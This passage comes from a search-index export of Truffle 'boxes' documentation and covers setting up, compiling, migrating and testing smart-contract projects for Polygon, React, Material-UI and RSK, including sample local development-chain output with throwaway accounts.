distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference! Polygon PoS Chain \u00b6 Compiling \u00b6 You do not need to add any new compilers or settings to compile your contracts for the Polygon PoS chain, as it is fully EVM compatible. The truffle-config.polygon.js configuration file indicates the contract and build paths for Polygon-destined contracts. If you are compiling contracts specifically for the Polygon PoS network, use the following command, which indicates the appropriate configuration file: npm run compile:polygon If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config=truffle-config.polygon.js and add the --all flag. Migrating \u00b6 To migrate on the Polygon PoS network, run npm run migrate:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet) (remember to choose a network from these options!). As you can see, you have several Polygon PoS L2 networks to choose from: Infura networks . Infura is running a testnet node as well as a mainnet node for the Polygon PoS chain. Deployment to these networks requires that you sign up for an Infura account and initiate a project. See the Infura website for details . In the example network configuration, we expect you to have a public Infura project key, which you should indicate in your .env file. The following Infura networks are indicated in the truffle-config.polygon.js file: polygon_infura_testnet : This is the Infura Polygon PoS testnet. polygon_infura_mainnet : This is the Infura Polygon PoS mainnet. Caution! If you deploy to this network using a connected wallet, the fees are charged in mainnet MATIC. If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.polygon.js --network= (polygon_infura_testnet | polygon_infura_mainnet) and add the --reset flag. Paying for Migrations \u00b6 To pay for your deployments, you will need to have an account with ETH available to spend. You will need your mnemomic phrase (saved in the .env file or through some other secure method). The first account generated by the seed needs to have the ETH you need to deploy. For reference, the Polygon PoS testnets are based in goerli, so you should be able to use goerli ETH. If you do not have a wallet with funds to deploy, you will need to connect a wallet to at least one of the networks above. For testing, this means you will want to connect a wallet to the polygon_infura_testnet network. We recommend using MetaMask . Documentation for how to set up MetaMask custom networks with the Polygon PoS network can be found here . Follow the steps in the documentation above using Infura's RPC endpoints ( \"https://polygon-mainnet.infura.io/v3/\" + infuraProjectId and \"https://polygon-mumbai.infura.io/v3/\" + infuraProjectId ). The chainId values are the same as those in the truffle-config.polygon.js networks entries. To get testnet ETH to use, visit a faucet like https://goerli-faucet.slock.it/. Basic Commands \u00b6 The code here will allow you to compile, migrate, and test your code against a Polygon PoS network instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:polygon To migrate: npm run migrate:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet) To test: npm run test:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet) Testing \u00b6 In order to run the test currently in the boilerplate, use the following command: npm run test:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet) (remember to choose a network!). The current test file just has some boilerplate tests to get you started. You will likely want to add network-specific tests to ensure your contracts are behaving as expected. Communication Between Ethereum and Polygon PoS Chains \u00b6 The information above should allow you to deploy to the Polygon PoS Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on L1 using L2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Polygon ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full Polygon PoS L2 integration! Support \u00b6 Support for this box is available via the Truffle community here .", "title": "Polygon Box"}, {"location": "boxes/polygon/#polygon-box", "text": "Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Polygon PoS Chain Compiling Migrating Paying For Migrations Basic Commands Testing Communication Between Ethereum and Polygon PoS Chains Support Table of contents generated with markdown-toc This Truffle Polygon box provides you with the boilerplate structure necessary to start coding for Polygon's Ethereum L2 solution, the Polygon PoS chain (previously called the Matic PoS chain). For detailed information on how the Polygon PoS chain works, please see their documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Polygon PoS without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Polygon PoS networks. Polygon's L2 solution is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the Polygon PoS network. Additionally, Polygon offers multiple ways for dapp developers to implement communication between Ethereum (\"Layer 1\") and Polygon PoS. Further information about how to enable Ethereum-Polygon communication can be found in the Polygon documentation here . A note about naming: The Polygon ecosystem was previously called Matic Network. The chain to which we'll be deploying in this Truffle Box is now called the Polygon PoS chain. We have named this box the Polygon Box because we expect to include the ability to deploy to future Polygon chains in addition to what is presented here as an initial proof-of-concept, and developers using this Polygon Box may find themselves incorporating additional aspects of the Polygon ecosystem in their work.", "title": "Polygon Box"}, {"location": "boxes/polygon/#requirements", "text": "The Polygon box has the following requirements: Node.js 10.x or later NPM version 5.2 or later Windows, Linux or MacOS Helpful, but optional: An Infura account and Project ID A MetaMask account", "title": "Requirements"}, {"location": "boxes/polygon/#installation", "text": "$ truffle unbox polygon", "title": "Installation"}, {"location": "boxes/polygon/#setup", "text": "", "title": "Setup"}, {"location": "boxes/polygon/#using-the-env-file", "text": "You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.polygon.js file expects a MNEMONIC value to exist in .env for running migrations on the networks listed in truffle-config.polygon.js . If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own mnemonic and Infura project key: MNEMONIC=\"<Your Mnemonic>\" INFURA_PROJECT_ID=\"<Your Infura Project ID>\" As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .", "title": "Using the env File"}, {"location": "boxes/polygon/#new-configuration-file", "text": "A new configuration file exists in this project: truffle-config.polygon.js . This file contains a reference to the new file location of the contracts_build_directory for Polygon PoS contracts and lists several networks that are running the Polygon PoS Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder.", "title": "New Configuration File"}, {"location": "boxes/polygon/#new-directory-structure-for-artifacts", "text": "When you compile or migrate, the resulting json files will be at build/polygon-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference!", "title": "New Directory Structure for Artifacts"}, {"location": "boxes/polygon/#polygon-pos-chain", "text": "", "title": "Polygon PoS Chain"}, {"location": "boxes/polygon/#compiling", "text": "You do not need to add any new compilers or settings to compile your contracts for the Polygon PoS chain, as it is fully EVM compatible. The truffle-config.polygon.js configuration file indicates the contract and build paths for Polygon-destined contracts. If you are compiling contracts specifically for the Polygon PoS network, use the following command, which indicates the appropriate configuration file: npm run compile:polygon If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config=truffle-config.polygon.js and add the --all flag.", "title": "Compiling"}, {"location": "boxes/polygon/#migrating", "text": "To migrate on the Polygon PoS network, run npm run migrate:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet) (remember to choose a network from these options!). As you can see, you have several Polygon PoS L2 networks to choose from: Infura networks . Infura is running a testnet node as well as a mainnet node for the Polygon PoS chain. Deployment to these networks requires that you sign up for an Infura account and initiate a project. See the Infura website for details . In the example network configuration, we expect you to have a public Infura project key, which you should indicate in your .env file. The following Infura networks are indicated in the truffle-config.polygon.js file: polygon_infura_testnet : This is the Infura Polygon PoS testnet. polygon_infura_mainnet : This is the Infura Polygon PoS mainnet. Caution! If you deploy to this network using a connected wallet, the fees are charged in mainnet MATIC. If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.polygon.js --network= (polygon_infura_testnet | polygon_infura_mainnet) and add the --reset flag.", "title": "Migrating"}, {"location": "boxes/polygon/#paying-for-migrations", "text": "To pay for your deployments, you will need to have an account with ETH available to spend. You will need your mnemomic phrase (saved in the .env file or through some other secure method). The first account generated by the seed needs to have the ETH you need to deploy. For reference, the Polygon PoS testnets are based in goerli, so you should be able to use goerli ETH. If you do not have a wallet with funds to deploy, you will need to connect a wallet to at least one of the networks above. For testing, this means you will want to connect a wallet to the polygon_infura_testnet network. We recommend using MetaMask . Documentation for how to set up MetaMask custom networks with the Polygon PoS network can be found here . Follow the steps in the documentation above using Infura's RPC endpoints ( \"https://polygon-mainnet.infura.io/v3/\" + infuraProjectId and \"https://polygon-mumbai.infura.io/v3/\" + infuraProjectId ). The chainId values are the same as those in the truffle-config.polygon.js networks entries. To get testnet ETH to use, visit a faucet like https://goerli-faucet.slock.it/.", "title": "Paying for Migrations"}, {"location": "boxes/polygon/#basic-commands", "text": "The code here will allow you to compile, migrate, and test your code against a Polygon PoS network instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:polygon To migrate: npm run migrate:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet) To test: npm run test:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet)", "title": "Basic Commands"}, {"location": "boxes/polygon/#testing", "text": "In order to run the test currently in the boilerplate, use the following command: npm run test:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet) (remember to choose a network!). The current test file just has some boilerplate tests to get you started. You will likely want to add network-specific tests to ensure your contracts are behaving as expected.", "title": "Testing"}, {"location": "boxes/polygon/#communication-between-ethereum-and-polygon-pos-chains", "text": "The information above should allow you to deploy to the Polygon PoS Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on L1 using L2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Polygon ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full Polygon PoS L2 integration!", "title": "Communication Between Ethereum and Polygon PoS Chains"}, {"location": "boxes/polygon/#support", "text": "Support for this box is available via the Truffle community here .", "title": "Support"}, {"location": "boxes/rapid-box/", "text": "Rapid Box \u00b6 A quick start truffle box to host REST APIs interacting with Smart Contracts. Key features \u00b6 Rapid Box allows your to focus on development of your Smart Contracts and exposing them through an API service, without spending time bridging Contract ABIs into your Express project. The box takes care of auto-loading Truffle Contract definitions into the Contracts helper. The Contracts helper also exposes the web3 object for RPC operations like getAccounts . Server start accepts RPC endpoint as a parameter making it easy to switch between environments. Example \u00b6 Exposing an endpoint to get value from SimpleStorage. // Contracts helper const Contracts = require('./app/contracts.js'); ... // Get storage contract value app.get('/storage', function (req, res) { Contracts.SimpleStorage.deployed().then(function (instance) { instance.get.call().then(function (value) { res.json({ value: value }); }); }); }); Setup \u00b6 To unbox to your workspace. truffle unbox hexeight/rapid-box Development \u00b6 Continue to use truffle as usual ;) Compile contracts: truffle compile Migrate contracts: truffle migrate Test contracts: truffle test Run server: npm start -- --rpc <RPC endpoint> Run \u00b6 To run the API service, the RPC endpoint parameter is required. This allows switching RPC endpoints during development. For example: # Note that npm start requires the extra -- to different between npm arguments and your script arguments. npm start -- --rpc http://localhost:8545 OR node server.js --rpc http://localhost:8545 Feedback \u00b6 Feel free to send in pull-requests and raise issues with any feedback.", "title": "Rapid Box"}, {"location": "boxes/rapid-box/#rapid-box", "text": "A quick start truffle box to host REST APIs interacting with Smart Contracts.", "title": "Rapid Box"}, {"location": "boxes/rapid-box/#key-features", "text": "Rapid Box allows your to focus on development of your Smart Contracts and exposing them through an API service, without spending time bridging Contract ABIs into your Express project. The box takes care of auto-loading Truffle Contract definitions into the Contracts helper. The Contracts helper also exposes the web3 object for RPC operations like getAccounts . Server start accepts RPC endpoint as a parameter making it easy to switch between environments.", "title": "Key features"}, {"location": "boxes/rapid-box/#example", "text": "Exposing an endpoint to get value from SimpleStorage. // Contracts helper const Contracts = require('./app/contracts.js'); ... // Get storage contract value app.get('/storage', function (req, res) { Contracts.SimpleStorage.deployed().then(function (instance) { instance.get.call().then(function (value) { res.json({ value: value }); }); }); });", "title": "Example"}, {"location": "boxes/rapid-box/#setup", "text": "To unbox to your workspace. truffle unbox hexeight/rapid-box", "title": "Setup"}, {"location": "boxes/rapid-box/#development", "text": "Continue to use truffle as usual ;) Compile contracts: truffle compile Migrate contracts: truffle migrate Test contracts: truffle test Run server: npm start -- --rpc <RPC endpoint>", "title": "Development"}, {"location": "boxes/rapid-box/#run", "text": "To run the API service, the RPC endpoint parameter is required. This allows switching RPC endpoints during development. For example: # Note that npm start requires the extra -- to different between npm arguments and your script arguments. npm start -- --rpc http://localhost:8545 OR node server.js --rpc http://localhost:8545", "title": "Run"}, {"location": "boxes/rapid-box/#feedback", "text": "Feel free to send in pull-requests and raise issues with any feedback.", "title": "Feedback"}, {"location": "boxes/react/", "text": "React Truffle Box \u00b6 This box comes with everything you need to start using Truffle to write, compile, test, and deploy smart contracts, and interact with them from a React app. Installation \u00b6 First ensure you are in an empty directory. Run the unbox command using 1 of 2 ways. # Install Truffle globally and run `truffle unbox` $ npm install -g truffle $ truffle unbox react # Alternatively, run `truffle unbox` via npx $ npx truffle unbox react Start the react dev server. $ cd client $ npm start From there, follow the instructions on the hosted React app. It will walk you through using Truffle and Ganache to deploy the SimpleStorage contract, making calls to it, and sending transactions to change the contract's state. FAQ \u00b6 How do I use this with Ganache (or any other network)? The Truffle project is set to deploy to Ganache by default. If you'd like to change this, it's as easy as modifying the Truffle config file! Check out our documentation on adding network configurations . From there, you can run truffle migrate pointed to another network, restart the React dev server, and see the change take place. Where can I find more resources? This Box is a sweet combo of Truffle and Webpack . Either one would be a great place to start!", "title": "React Truffle Box"}, {"location": "boxes/react/#react-truffle-box", "text": "This box comes with everything you need to start using Truffle to write, compile, test, and deploy smart contracts, and interact with them from a React app.", "title": "React Truffle Box"}, {"location": "boxes/react/#installation", "text": "First ensure you are in an empty directory. Run the unbox command using 1 of 2 ways. # Install Truffle globally and run `truffle unbox` $ npm install -g truffle $ truffle unbox react # Alternatively, run `truffle unbox` via npx $ npx truffle unbox react Start the react dev server. $ cd client $ npm start From there, follow the instructions on the hosted React app. It will walk you through using Truffle and Ganache to deploy the SimpleStorage contract, making calls to it, and sending transactions to change the contract's state.", "title": "Installation"}, {"location": "boxes/react/#faq", "text": "How do I use this with Ganache (or any other network)? The Truffle project is set to deploy to Ganache by default. If you'd like to change this, it's as easy as modifying the Truffle config file! Check out our documentation on adding network configurations . From there, you can run truffle migrate pointed to another network, restart the React dev server, and see the change take place. Where can I find more resources? This Box is a sweet combo of Truffle and Webpack . Either one would be a great place to start!", "title": "FAQ"}, {"location": "boxes/react-box-web3-todo/", "text": "React Web3 Redux Todo Truffle Box \u00b6 This box comes with everything you need to start using smart contracts from a react app. This is as barebones as it gets, so nothing stands in your way. Installation \u00b6 Install Truffle and an Ethereum client. For local development, try EthereumJS TestRPC. npm install - g truffle // Version 3.0.5+ required. npm install - g ethereumjs - testrpc Unbox in the project directory. This will also install the dependencies. truffle unbox shanejonas / react - box - web3 - todo . git Compile and migrate the contracts. truffle compile truffle migrate Run the webpack server for front-end hot reloading. For now, smart contract changes must be manually recompiled and migrated. npm run start Jest is included for testing React components and Truffle's own suite is included for smart contracts. Be sure you've compile your contracts before running jest, or you'll receive some file not found errors. // Runs Jest for component tests. npm run test // Runs Truffle's test suite for smart contract tests. truffle test To build the application for production, use the build command. A production build will be in the build_webpack folder. npm run build FAQ \u00b6 Why is there both a truffle.js file and a truffle-config.js file? Truffle requires the truffle.js file be named truffle-config on Windows machines. Feel free to delete the file that doesn't correspond to your platform. Where is my production build? The production build will be in the build_webpack folder. This is because Truffle outputs contract compilations to the build folder. Where can I find more documentation? This Truffle Box is a marriage of Truffle and a React setup created with create-react-app . Either one would be a great place to start!", "title": "React Web3 Redux Todo Truffle Box"}, {"location": "boxes/react-box-web3-todo/#react-web3-redux-todo-truffle-box", "text": "This box comes with everything you need to start using smart contracts from a react app. This is as barebones as it gets, so nothing stands in your way.", "title": "React Web3 Redux Todo Truffle Box"}, {"location": "boxes/react-box-web3-todo/#installation", "text": "Install Truffle and an Ethereum client. For local development, try EthereumJS TestRPC. npm install - g truffle // Version 3.0.5+ required. npm install - g ethereumjs - testrpc Unbox in the project directory. This will also install the dependencies. truffle unbox shanejonas / react - box - web3 - todo . git Compile and migrate the contracts. truffle compile truffle migrate Run the webpack server for front-end hot reloading. For now, smart contract changes must be manually recompiled and migrated. npm run start Jest is included for testing React components and Truffle's own suite is included for smart contracts. Be sure you've compile your contracts before running jest, or you'll receive some file not found errors. // Runs Jest for component tests. npm run test // Runs Truffle's test suite for smart contract tests. truffle test To build the application for production, use the build command. A production build will be in the build_webpack folder. npm run build", "title": "Installation"}, {"location": "boxes/react-box-web3-todo/#faq", "text": "Why is there both a truffle.js file and a truffle-config.js file? Truffle requires the truffle.js file be named truffle-config on Windows machines. Feel free to delete the file that doesn't correspond to your platform. Where is my production build? The production build will be in the build_webpack folder. This is because Truffle outputs contract compilations to the build folder. Where can I find more documentation? This Truffle Box is a marriage of Truffle and a React setup created with create-react-app . Either one would be a great place to start!", "title": "FAQ"}, {"location": "boxes/react-dapp-boilerplate/", "text": "React DApp Boilerplate - the best UI foundational boilerplate for Ethereum dApps. Notional.Finance was built with React DApp Boilerplate.", "title": "Index"}, {"location": "boxes/react-material-ui/", "text": "React + Material-UI + Truffle Box Rapid Ethereum Dapp Development This box contains everything you need to get started using smart contracts from a Rect app with the Material-ui library. Installation \u00b6 First, create a new empty directory and go to it. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A React app is generated a the root of the directory. npx truffle unbox rouftom / truffle - react - material Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox rouftom / truffle - react - material Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate If you want to migrate your smart contract with a fresh blockchain state, you can run the command below. javascript truffle migrate --reset The --reset flag purge the blockchain state. Don't run the command with this flag in production unless you know what you are doing. In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) npm run start Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test For testing React components with Jest, you can install it as dev dependency. Compile your contracts before running Jest, or you may receive some file not found errors. // ensure you are inside the client.old directory when running this npm install -- save - dev @ testing - library / react npm run test To build the application for production, use the build script. A production build will be in the dist/ folder. // ensure you are inside the client.old directory when running this npm run build FAQ \u00b6 How do I use this with the Ganache-CLI? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Depending on the port you're using, you'll need to update line 12 of src/lib/Web3Context.js . You'll also need to update the line 10 of src/lib/MyContractContext.js depending your network id. Where is my production build? The production build will be in the dist/ folder after running npm run build in the root folder. Where can I find more documentation? This box is a marriage of Truffle and a React setup created with React . Either one would be a great place to start! This box is composed of Truffle , React , Material-UI , Webpack 5 and Babel 7 You can also find amazing royalty free illustrations on Manypixels Extra \u00b6 \ud83d\ude0a Do you like this library ? Buy me a coffee or support me with a star on Github Btc address: bc1qettgagenn9nc8ks7ghntjfme96yvvkfhntk774 Eth address: 0xB0413d8D0336E263e289A915c383e152155881E0", "title": "Index"}, {"location": "boxes/react-material-ui/#installation", "text": "First, create a new empty directory and go to it. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A React app is generated a the root of the directory. npx truffle unbox rouftom / truffle - react - material Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox rouftom / truffle - react - material Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate If you want to migrate your smart contract with a fresh blockchain state, you can run the command below. javascript truffle migrate --reset The --reset flag purge the blockchain state. Don't run the command with this flag in production unless you know what you are doing. In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) npm run start Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test For testing React components with Jest, you can install it as dev dependency. Compile your contracts before running Jest, or you may receive some file not found errors. // ensure you are inside the client.old directory when running this npm install -- save - dev @ testing - library / react npm run test To build the application for production, use the build script. A production build will be in the dist/ folder. // ensure you are inside the client.old directory when running this npm run build", "title": "Installation"}, {"location": "boxes/react-material-ui/#faq", "text": "How do I use this with the Ganache-CLI? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Depending on the port you're using, you'll need to update line 12 of src/lib/Web3Context.js . You'll also need to update the line 10 of src/lib/MyContractContext.js depending your network id. Where is my production build? The production build will be in the dist/ folder after running npm run build in the root folder. Where can I find more documentation? This box is a marriage of Truffle and a React setup created with React . Either one would be a great place to start! This box is composed of Truffle , React , Material-UI , Webpack 5 and Babel 7 You can also find amazing royalty free illustrations on Manypixels", "title": "FAQ"}, {"location": "boxes/react-material-ui/#extra", "text": "\ud83d\ude0a Do you like this library ? Buy me a coffee or support me with a star on Github Btc address: bc1qettgagenn9nc8ks7ghntjfme96yvvkfhntk774 Eth address: 0xB0413d8D0336E263e289A915c383e152155881E0", "title": "Extra"}, {"location": "boxes/rsk-next-box/", "text": "RSK Next JS Box \u00b6 This box comes with everything you need to start using smart contracts from a react app and Next JS on RSK Blockchain . It includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy. Requirements \u00b6 NPM (Node Package Manager) Node.js and NPM are needed, though both are usually installed at once. Go to Node.js if you need to install it. Truffle Install Truffle globally: npm install -g truffle Installation \u00b6 Create a new folder. For example, create the folder rsk-next . Navigate to the folder in the terminal. mkdir rsk-next cd rsk-next Run the unbox command. It can take some time, as this will install all necessary dependencies. truffle unbox rsksmart/rsk-next-box A Create-React-Next-App is generated in the app directory. This is the result using Windows OS: Development console \u00b6 Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop REPL with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-next>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db (7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)> Take a look at the smart contract SimpleStorage.sol . You can check it out in folder contracts . This smart contract has: A variable storedData to store a number A function get() to return the number stored at variable storedData A function set() to change the number stored at variable storedData Compile and migrate the smart contract. Note inside the development console we don't preface commands with truffle. To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: migrate And the migrate output should be similar to: Running contract tests. Our box also comes with the file TestSimpleStorage.js for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test This test output should be similar to: Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console. truffle test Client side application \u00b6 Our box has done a front end to interact with the smart contract, built using React app and Next JS. In another terminal (i.e. not in the truffle develop prompt), go to the app directory and run the React app. Do not close the other terminal, which is running the Truffle development console, because it is our Blockchain simulator. If you close it and then open it again, you need to deploy / migrate the smart contract again too! cd app npm run dev Then go to your browser at http://localhost:3000/ Smart contract changes must be manually recompiled and migrated! NOTE : This box is the starting point for the RSK tutorial Using rsk-next-box . Using RSK networks \u00b6 Setup an account & get R-BTC \u00b6 Get an address, learning how works the account based RSK addresses . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange . Setup the gas price \u00b6 Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go to gas page . Connect to RSK \u00b6 Copy your mnemonic to truffle-config.js //Put your mnemonic here, be careful not to deploy your mnemonic into production! const mnemonic = 'A_MNEMONIC' ; Please be aware that we are using HDWalletProvider with RSK Networks derivations path: - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 For more information check RSKIP57 . Run the development console for any RSK network. # Console for Testnet truffle console --network testnet # Console for Mainnet truffle console --network mainnet Migrate the smart contracts. We will do it running the below commands directly in the terminal, without using the truffle console now to show to you this alternative. truffle migrate Update Express JS component. The component located in the file web3-util.js uses the web3.js library to interact with the blockchain - writing code that reads and writes data from the blockchain with smart contracts. Choose which network you would like to connect the server to RSK Network and update line 15 of the file app/utils/web3-util.js Testnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.testnet.rsk.co\" ); Mainnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.rsk.co\" ); In a terminal, go to the app directory and run the React app. cd app npm run dev Go to your browser at http://localhost:3000/ Note that when you are connected to an RSK network, you do not need to leave open the Truffle console, because the app is connected via a public node, directly to the network. Next steps \u00b6 Go to tutorial Go to the tutorial using rsk-next-box to learn more about this project. We covered all the steps with more details, explanations, and images. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in RSK chat .", "title": "RSK Next JS Box"}, {"location": "boxes/rsk-next-box/#rsk-next-js-box", "text": "This box comes with everything you need to start using smart contracts from a react app and Next JS on RSK Blockchain . It includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy.", "title": "RSK Next JS Box"}, {"location": "boxes/rsk-next-box/#requirements", "text": "NPM (Node Package Manager) Node.js and NPM are needed, though both are usually installed at once. Go to Node.js if you need to install it. Truffle Install Truffle globally: npm install -g truffle", "title": "Requirements"}, {"location": "boxes/rsk-next-box/#installation", "text": "Create a new folder. For example, create the folder rsk-next . Navigate to the folder in the terminal. mkdir rsk-next cd rsk-next Run the unbox command. It can take some time, as this will install all necessary dependencies. truffle unbox rsksmart/rsk-next-box A Create-React-Next-App is generated in the app directory. This is the result using Windows OS:", "title": "Installation"}, {"location": "boxes/rsk-next-box/#development-console", "text": "Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop REPL with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-next>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db 